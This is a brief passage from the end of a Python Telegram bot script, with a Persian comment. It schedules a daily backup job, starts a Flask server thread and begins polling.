        # بکاپ خودکار (هر ۲۴ ساعت)
        bot_app.job_queue.run_repeating(
            scheduled_backup,
            interval=86400,  # 24h
            first=3600
        )
        print(f"⏰ Report every {interval} min, Backup every 24h")

    threading.Thread(target=run_flask, daemon=True).start()
    print("✅ Bot ready!")
    bot_app.run_polling()


if __name__ == "__main__":
    main()